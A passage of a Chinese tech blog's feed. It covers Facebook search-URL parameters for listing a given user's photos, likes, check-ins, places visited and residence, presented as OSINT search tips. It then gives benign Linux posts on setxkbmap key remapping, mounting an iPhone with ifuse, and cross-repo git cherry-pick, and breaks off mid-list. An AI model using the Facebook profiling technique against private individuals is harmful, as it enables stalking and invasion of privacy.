&lt;p&gt;如果該名使用者沒有自訂 username 的話，只要連到該名 Facebook 使用者的個人頁面後，檢查一下網址列，就會看到最後面應該會是一串數字，那個就是該名使用者的 Facebook。  &lt;/p&gt;
&lt;p&gt;如果該名使用者有自訂 username 的話，你連到他的 Facebook 個人頁面應該會看到網址最後面就是他自訂的 username，而不會是 Facebook User ID。這時候可以透過這個網頁來做查詢：&lt;a href="https://findmyfbid.in"&gt;https://findmyfbid.in&lt;/a&gt;，這個網站本身就有教學了，用法也很簡單。  &lt;/p&gt;
&lt;p&gt;一樣是連到該名 Facebook 使用者的個人頁面，把他的網址複製下來，然後貼到 &lt;a href="https://findmyfbid.in"&gt;https://findmyfbid.in&lt;/a&gt; 進行查詢就行了。如果有順利查詢到的話，就會得到代表該名 Facebook 使用者的一串數字，即為其 ID。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;拿到 ID 後？&lt;/h2&gt;
&lt;p&gt;就可以進入正題了，一般人在 Facebook 進行搜尋的時候，應該普遍都是透過網頁上方的 Search bar 進行搜尋吧？這些查詢的結果都是透過 API 進行搜尋的，其實可以透過修改網址直接得到查詢結果，操作方式也不難，以下簡單講解。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;基本格式&lt;/h2&gt;
&lt;p&gt;最基本的網址格式長的像這樣：  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;https://www.facebook.com/search/str/$FACEBOOK_USER_ID&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;也可以是  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;fb.com/search/str/$FACEBOOK_USER_ID&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;以 Mark Zuckerburg 為例的話，就會是：  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;https://www.facebook.com/search/str/4&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;或是  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;fb.com/search/4&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;知道了這個基本格式以後，接下來會加上的參數都是加在後面，就可以得到相對應的搜尋結果，這個方法可以用在所有的使用者身上，但得到的結果會是以你登入的 Facbeook 帳號權限而定，並不會得到該名使用者所有的資訊，除非你是查詢你目前登入的 Facebook 使用者。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;基本參數&lt;/h2&gt;
&lt;p&gt;以下參數都是直接接在上面提到的基本格式字串的後面就行了，會是這樣的形式：  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;fb.com/search/str/$FACEBOOK_USER_ID/$OPTION&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;舉例來說，如果選項是下面提到的 &lt;code&gt;/photos-by/&lt;/code&gt; 的話，就會是這樣使用：  &lt;/p&gt;
&lt;p&gt;&lt;a href="http://fb.com/search/4/photos-by/"&gt;&lt;code&gt;fb.com/search/4/photos-by/&lt;/code&gt;&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;其他參數依此類推，以下就列出有哪些參數可以使用，因為這些參數其實都已經和使用英文版 Facebook 搜尋時會顯示的一般英文一樣了，所以就不多做說明，有興趣的人可以試一試。  &lt;/p&gt;
&lt;h3&gt;和發文有關的&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/stories-by/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/stories-liked/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/stories-commented/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/stories-publishers/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/stories-tagged/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/stories-media-tagged/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/stories-in/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/stories-topic/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/stories-news/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/stories-recent/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/reshare-stories-by/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/reviews-at/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/hashtag/&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;和照片有關的&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/photos-by/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/photos-uploaded/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/photos-of/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/photos-tagged/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/photos-in/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/photos-keyword/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/photos-liked/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/photos-commented/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/photos-interested/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/photos-interacted/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/photos-recommended-for/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/recent-photos/&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;和按讚有關的&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/stories-liked/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/photos-liked/&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;和留言有關的&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/stories-commented/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/photos-commented/&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;和打卡、地點、評論有關的&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/recent-places-visited/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/places-visited/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/places-checked-in/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/visitors/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/places-named/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/places-in/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/places-near/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/places-reviewed/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/pages-in/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/stories-at/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/reviews-at/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/events-at/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/events-near/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/residents/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/home-residents/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/users-birth-place/&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;結論&lt;/h2&gt;
&lt;p&gt;善用這些搜尋網址可能可以在 Facebook 上做更有效的搜尋，有些是透過預設的搜尋介面比較難選取到的部份，參考的這篇文章：&lt;a href="https://netbootcamp.org/facebookpeoplesearchtips/"&gt;Facebook People Search Tips | OSINT Training by Bob Brasich&lt;/a&gt; 裡頭還有提到一些更進階的小技巧，可以結合兩個參數做搜尋，例如搜尋某間公司擁有某個名字的 Facebook 使用者、搜尋住處在某個地方擁有某個姓名的使用者、……等等，像下面這些參數就是可以用來做更進階一些搜尋用的參數：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;和時間有關的  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;/yesterday/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/today/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/this-week/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/last-week/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/recent/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/this-month/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/last-month/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/this-year/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/last-year/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/YEAR/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/before/ /after/&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;和關鍵字有關的  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;/stories-keyword/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/photos-keyword/&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;和名字有關的  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;/users-named/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/pages-named/&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;這部份必須要在網址最後加上 &lt;code&gt;/intersect/&lt;/code&gt;，表示取這幾個選項的交集做搜尋，格式也有稍稍的不太一樣，這邊就不做詳細的介紹，有興趣的人可以再點下面參考文章的第一篇進去察看，裏面有滿多實際例子的。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;參考資料&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://netbootcamp.org/facebookpeoplesearchtips/"&gt;Facebook People Search Tips | OSINT Training by Bob Brasich&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://findmyfbid.in/"&gt;Find Facebook ID in two simple steps | Find Facebook ID&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Facebook"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>Linux 上如何透過指令更改鍵盤鍵位</title><link href="https://blog.m157q.tw/posts/2018/01/01/change-keymap-on-linux/" rel="alternate"></link><published>2018-01-02T22:17:41+08:00</published><updated>2018-01-02T22:17:41+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2018-01-01:posts/2018/01/01/change-keymap-on-linux/</id><summary type="html">&lt;h2&gt;TL;DR&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;setxkbmap -option ctrl:swapcaps -option altwin:swap_alt_win&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/M157q/dotfiles/blob/master/swap_win_keyboard_layout.sh"&gt;dotfiles/swap_win_keyboard_layout.sh at master · M157q/dotfiles · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;setxkbmap -option ctrl:swapcaps&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/M157q/dotfiles/blob/master/swap_mac_keyboard_layout.sh"&gt;dotfiles/swap_mac_keyboard_layout.sh at master · M157q/dotfiles · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;這邊提到的都會是在 X Window 環境下的設定方式為主，這是我目前正在使用也確定可行的方法。非 X Window 的環境下則是放在補充，但因為這部份我沒有親自試過，所以僅供參考。  &lt;/p&gt;
&lt;p&gt;之前都是用 &lt;code&gt;xmodmap&lt;/code&gt; 這個指令，搭配一份已經預先寫好的設定檔：&lt;a href="https://github.com/M157q/dotfiles/blob/master/Xmodmap"&gt;dotfiles/Xmodmap at master · M157q/dotfiles · GitHub&lt;/a&gt;，讓 &lt;code&gt;xmodmap&lt;/code&gt; 去執行這份設定檔，它會依照設定檔把鍵位更換掉。但因為我有時候是使用 Mac Book Air 的 Mac 鍵盤，有時候是外接 Filco 的鍵盤，差別最大的地方在於左下角。Mac 的鍵盤會多了一顆 Command 鍵，然後在桌面環境下，無論是我之前使用的 AwesomeWM 或是現在使用的 i3wm，在使用 Mac 鍵盤的時候會以 Command 鍵來當作 Mod4 鍵，但在非 Mac 鍵盤上，則會以 Win 鍵來當作 Mod4 鍵。  &lt;/p&gt;
&lt;p&gt;問題就在於我已經習慣 Mac 鍵盤上的設定，覺得 Mod4 鍵在空白鍵的左邊比較順手，如果使用非 Mac 鍵盤的話，Mod4 鍵則會在空白鍵左邊的左邊，按起來比較抝手。所以針對不同的鍵盤我得有不同鍵位的改變設定，讓我的操作習慣一致。  &lt;/p&gt;
&lt;p&gt;之前就覺得 &lt;code&gt;xmodmap&lt;/code&gt; 的設定檔有點冗長，我只是要單純切換 CapsLock 和左邊的 Ctrl 鍵就要 6 行，等於是我要寫另外一份設定檔，加上我去看了設定檔的文件，覺得挺麻煩的，我也常常搞混。於是就花了點時間找尋看看有沒有比較方便的方式，後來找到 &lt;code&gt;setxkbmap&lt;/code&gt; 這個指令，可以直接一行指令解決，利用這篇文章紀錄一下。  &lt;/p&gt;
&lt;p&gt;不管是 Mac 鍵盤上的 Command 鍵，或是非 Mac 鍵盤上的 Win 鍵，在 X Window 的鍵位判定上都會被當作是 "Super" 鍵，即這兩個會被當成是一樣作用的按鈕，但是他們在鍵盤上排列的位置卻不相同：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Mac 鍵盤，Command 鍵都是在空白鍵隔壁。  &lt;/li&gt;
&lt;li&gt;非 Mac 鍵盤，Win 鍵都是在空白鍵隔壁的隔壁，中間隔著一個 Alt 鍵。  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;也就是只要我使用非 Mac 鍵盤的話，我就會需要把 Super 鍵和 Alt 鍵對調。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;正文&lt;/h2&gt;
&lt;p&gt;首先當然是得安裝 &lt;code&gt;setxkbmap&lt;/code&gt; 這個程式，如果是使用 Arch Linux 的話，可以用以下指令安裝：&lt;br /&gt;
&lt;code&gt;sudo pacman -S xorg-setxkbmap&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;安裝好了之後，使用方式也很簡單，就只要一行指令就行，然後每一個設定就使用 &lt;code&gt;-option&lt;/code&gt; 參數來設定，有三個設定就會有三個 &lt;code&gt;-option&lt;/code&gt;。切換的規則可以在 &lt;code&gt;/usr/share/X11/xkb/rules/base&lt;/code&gt; 找到，我覺得名稱還算好懂，但裏面其實有滿多規則的，這篇文章裏面不會一一介紹，只會講到我有用到的。  &lt;/p&gt;
&lt;p&gt;舉例來說，如果我要單純把 Ctrl 和 CapsLock 對調的話，就使用以下指令：&lt;br /&gt;
&lt;code&gt;setxkbmap -option ctrl:swapcaps&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;如果要把 Ctrl 和 CapsLock 對調還要把 Alt 和 Win 鍵對調的話，就使用以下指令：&lt;br /&gt;
&lt;code&gt;setxkbmap -option ctrl:swapcaps -option altwin:swap_alt_win&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;可以透過 &lt;code&gt;-device&lt;/code&gt; 這個參數來做到只針對特定的鍵盤來更改鍵位，不會同時更 MacBook Air 本身的鍵盤和 USB 外接鍵盤。至於這個參數要接的 device id 則可以透過 &lt;code&gt;xinput&lt;/code&gt; 這個指令來察看。而原先使用的 &lt;code&gt;xmodmap&lt;/code&gt; 則貌似無法針對個別鍵盤來做設定。  &lt;/p&gt;
&lt;p&gt;但每次要從已經更改後的鍵位，換到另外一個更改鍵位的時候，不能直接使用指令切換，而是得先用 &lt;code&gt;setxkbmap -option&lt;/code&gt; 來重置鍵位，然後才能再下另外一個指令來切換到另外一種鍵位，因為 &lt;code&gt;setxkbmap&lt;/code&gt; 預設是會繼續新增 &lt;code&gt;-option&lt;/code&gt; 到目前的設定，這也是為什麼我上面自己整理的兩個 script 的第一行都要先用 &lt;code&gt;setxkbmap -option&lt;/code&gt; 的原因。如果不這樣做的話，可能會出現很奇怪的狀況，這點是要注意的。在 &lt;code&gt;man setxkbmap&lt;/code&gt; 裡頭關於 &lt;code&gt;-option&lt;/code&gt; 的說明部份也有提到這點：  &lt;/p&gt;
&lt;p&gt;&lt;img alt="setxkbmap-option" src="/files/change-keymap-on-linux/setxkbmap-option.jpg" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;補充：xkbcomp&lt;/h2&gt;
&lt;p&gt;其實在 X Window 底下，除了使用 &lt;code&gt;xmodmap&lt;/code&gt; 和 &lt;code&gt;setxkbmap&lt;/code&gt; 兩個指令以外，還有一個 &lt;code&gt;xkbcomp&lt;/code&gt; 指令可以使用，但因為我覺得這個指令還是沒有 &lt;code&gt;setxkbmap&lt;/code&gt; 來得方便，所以後來沒有採用。&lt;code&gt;xkbcomp&lt;/code&gt; 一樣可以透過 &lt;code&gt;-i&lt;/code&gt; 來針對個別鍵盤做設定，而 device id 也是一樣透過 &lt;code&gt;xinput&lt;/code&gt; 這個指令來察看。  &lt;/p&gt;
&lt;p&gt;有關於 &lt;code&gt;xkbcomp&lt;/code&gt; 的設定：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;簡單的範例可以參考這篇文章：&lt;a href="https://lampjs.wordpress.com/2015/06/26/remapchange-your-secondaryusb-keyboard-keys/"&gt;Remap/change your secondary/usb keyboard keys – Linux, Apache, MySQL, PHP, Javascript&lt;/a&gt;。  &lt;/li&gt;
&lt;li&gt;詳細一點的可以參考 ArchWiki：&lt;a href="https://wiki.archlinux.org/index.php/X_KeyBoard_extension#Multiple_keyboards"&gt;X KeyBoard extension - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;補充：在無 X Window 的 virtual console 環境下切換鍵位&lt;/h2&gt;
&lt;p&gt;其實也有找到方法，在這篇文章有提到：&lt;a href="https://www.emacswiki.org/emacs/MovingTheCtrlKey#toc7"&gt;EmacsWiki: Moving The Ctrl Key&lt;/a&gt;，可以使用 &lt;code&gt;dumpkeys&lt;/code&gt; 和 &lt;code&gt;loadkeys&lt;/code&gt; 這兩個指令來辦到，但目前沒有強烈需求，如果哪天真的有在非 X Window 的環境下做到這件事不可的動機的話，應該就會花點時間來設定，看起來其實也是以下這樣的步驟，只是是在非 X Window 的環境下使用：  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;用 &lt;code&gt;dumpkeys&lt;/code&gt; 匯出鍵位設定檔  &lt;/li&gt;
&lt;li&gt;修改設定檔  &lt;/li&gt;
&lt;li&gt;再用 &lt;code&gt;loadkeys&lt;/code&gt; 匯入鍵位設定檔  &lt;/li&gt;
&lt;/ol&gt;
&lt;hr /&gt;
&lt;h2&gt;參考來源&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://superuser.com/questions/760602/how-to-remap-keys-under-linux-for-a-specific-keyboard-only"&gt;How to remap keys under Linux for a specific keyboard only - Super User&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.reddit.com/r/linux/comments/1kyikn/a_one_line_command_to_remap_the_capslock_key_to/"&gt;A one line command to remap the CapsLock key to Ctrl : linux&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://askubuntu.com/questions/33774/how-do-i-remap-the-caps-lock-and-ctrl-keys"&gt;keyboard - How do I remap the Caps Lock and Ctrl keys? - Ask Ubuntu&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.noah.org/wiki/CapsLock_Remap_Howto"&gt;CapsLock Remap Howto - Noah.org&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇也算是篇滿完整的文章，重點是它是個人用 Wiki 的頁面，覺得很厲害。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://lampjs.wordpress.com/2015/06/26/remapchange-your-secondaryusb-keyboard-keys/"&gt;Remap/change your secondary/usb keyboard keys – Linux, Apache, MySQL, PHP, Javascript&lt;/a&gt;。  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/X_KeyBoard_extension#Multiple_keyboards"&gt;X KeyBoard extension - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.emacswiki.org/emacs/MovingTheCtrlKey#toc7"&gt;EmacsWiki: Moving The Ctrl Key&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Linux"></category><category term="Keymap"></category><category term="xmodmap"></category><category term="setxkbmap"></category><category term="X Window"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>Linux 上如何拿到 iPhone 裡的資料</title><link href="https://blog.m157q.tw/posts/2017/12/31/mount-iphone-on-linux/" rel="alternate"></link><published>2017-12-31T19:01:07+08:00</published><updated>2017-12-31T19:01:07+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-12-31:posts/2017/12/31/mount-iphone-on-linux/</id><summary type="html">&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;今年 4 月換新手機，因為不愛大尺寸的手機，五吋以下的手機只剩 iPhone SE 和 Sony Xperia X Compact。但查了一下以後發現 Sony Xperia XC 似乎有過熱的問題，加上剛好當時在公司的時候有位同事幾週前才買 iPhone SE，跟他借來操作一下覺得還不錯，上網查了一些評價也都沒啥問題，而且又是秉持當初 Steve Jobs 的 iPhone 設計造型，於是就買了。  &lt;/p&gt;
&lt;p&gt;因為之前都是用 Android 手機，所以對 iPhone 的生態系不太熟，花了一點時間熟悉，其中一個就是現在紀錄的這篇。以前 Android 手機用 USB 線接到電腦後，基本上只要用 &lt;code&gt;adb&lt;/code&gt; 就可以搞定一切了，但 iPhone 這邊我花了點時間熟悉一下，還好有 ArchWiki 上有一篇專門在講 iOS 的條目：&lt;a href="https://wiki.archlinux.org/index.php/IOS"&gt;iOS - ArchWiki&lt;/a&gt;，省事了不少。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;方法&lt;/h2&gt;
&lt;p&gt;首先要安裝 &lt;code&gt;ifuse&lt;/code&gt;，如果是 Arch Linux 的使用者，可以直接用以下指令來安裝：  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;sudo pacman -S ifuse&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;安裝好之後使用也很簡單，只要按照以下的步驟：  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;將你的 iPhone 接上電腦的 USB 埠  &lt;/li&gt;
&lt;li&gt;接上之後可以透過 &lt;code&gt;lsusb&lt;/code&gt; 或 &lt;code&gt;dmesg&lt;/code&gt; 來做確認  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;ifuse ${PATH_FOR_IPHONE_DATA}&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;透過這個指令就可以 mount iPhone 的資料了  &lt;/li&gt;
&lt;li&gt;以我來說的話，我是特別開了一個 &lt;code&gt;/media/iPhone-SE&lt;/code&gt; 的資料夾來使用，所以指令會是 &lt;code&gt;ifuse /media/iPhone-SE&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;記得資料夾的權限要設定好  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;umount ${PATH_FOR_IPHONE_DATA}&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;使用完了以後要 unmount 也很簡單，就直接透過上面這個指令就行了  &lt;/li&gt;
&lt;li&gt;如果出現 Permission Denied 的話就加上 &lt;code&gt;sudo&lt;/code&gt; 吧  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr /&gt;
&lt;h2&gt;參考資料&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/IOS"&gt;iOS - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Linux"></category><category term="iPhone"></category><category term="ifuse"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>使用 Git 時如何做出跨 repo 的 cherry-pick</title><link href="https://blog.m157q.tw/posts/2017/12/30/git-cross-repo-cherry-pick/" rel="alternate"></link><published>2017-12-31T01:52:05+08:00</published><updated>2017-12-31T01:52:05+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-12-30:posts/2017/12/30/git-cross-repo-cherry-pick/</id><summary type="html">&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;會有這個需求是因為在前公司的時候，有個舊的 repo 執行的服務被因為裡頭的程式碼有太多舊的東西，但仍然有目前要用的部份，所以複製到了一個新的 repo。同時舊的這邊的改動又有需要更新到新的 repo，所以必須做到跨 repo 的 cherry-pick。查了一下，StackOverflow 上也有不少人問，打聽了一下身邊工程師的朋友們，也有人有過同樣的需求。這篇把我知道的 3 個方法整理起來，並列出哪個比較好及為什麼比較好的原因。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;TL;DR&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;git format-patch -k --stdout ${commit_hash_1}..${commmit_hash_2} | git am -3 -k&lt;/code&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;"git remote add + git fetch + git cherry-pick"&lt;/h3&gt;
&lt;p&gt;這個應該是最好懂的，只要有在 GitHub 上 fork 過別人的 repo，並按照 GitHub 的官方教學把對方的 repo 用 &lt;code&gt;git remote add&lt;/code&gt; 設定成 upstream 的人，對這套流程應該不陌生，大概就是以下的步驟：  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;git remote add&lt;/code&gt; 有你想要 &lt;code&gt;cherry-pick&lt;/code&gt; 的 commit 的 repo  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;git fetch&lt;/code&gt; 剛剛設定好的 remote  &lt;/li&gt;
&lt;li&gt;fetch 下來後就可以 &lt;code&gt;git checkout&lt;/code&gt; 到你要的 branch，然後用 &lt;code&gt;git log&lt;/code&gt; 找尋你要的 commit，紀錄下來後就可以進行 &lt;code&gt;cherry-pick&lt;/code&gt;  &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;如果這樣還是不太懂的話，底下有人回覆了這篇文章：&lt;a href="https://coderwall.com/p/sgpksw/git-cherry-pick-from-another-repository"&gt;Git cherry-pick from another repository (Example)&lt;/a&gt;，把完整的步驟與指令都清楚的列出來了。  &lt;/p&gt;
&lt;p&gt;這個方式很好懂，但很麻煩，因為步驟真的有點多。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;"git diff + git apply"&lt;/h3&gt;
&lt;p&gt;比較進階一點的 Git user 會用這個方法，觀念上沒有很難懂，只是要瞭解 &lt;code&gt;git diff&lt;/code&gt; 和 &lt;code&gt;git apply&lt;/code&gt; 這兩個指令在幹嘛。其實從字面上看來大概就可以猜測到，&lt;code&gt;git diff&lt;/code&gt; 生出一個 diff 檔，而 &lt;code&gt;git apply&lt;/code&gt; 把這個 diff 檔 apply 到某個 branch 上。  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;git diff&lt;/code&gt; 應該對大部分的 git user 來說不陌生，主要都是在修改檔案後要 &lt;code&gt;git add&lt;/code&gt; 之前，用 &lt;code&gt;git diff ${FILE_PATH}&lt;/code&gt; 來確認某個檔案修改的部份。但 &lt;code&gt;git diff&lt;/code&gt; 也可以用來看從 A commit 到 B commit 之間修改了哪些東西，用法也不難，&lt;code&gt;git diff ${A_COMMIT_HASH} ${B_COMMIT_HASH}&lt;/code&gt; 就行了。  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;git apply&lt;/code&gt; 可能是一般 Git user 比較少用到的，但也沒有很難懂。&lt;code&gt;man git-apply&lt;/code&gt; 顯示的簡介是 &lt;strong&gt;git-apply - Apply a patch to files and/or to the index&lt;/strong&gt;，簡單來說就把一個 patch 檔 apply 到你現在的 branch。  &lt;/p&gt;
&lt;p&gt;知道了這兩個指令在幹嘛以後，我們就可以透過以下步驟來達到我們想要的效果：  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;git diff ${A_COMMIT_HASH} ${B_COMMIT_HASH} &amp;gt; xxx.patch&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;在我們要抓 commmits 的 repo 下這行指令得到 patch 檔，以我的例子來說就是舊 repo。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;git apply xxx.patch&lt;/code&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
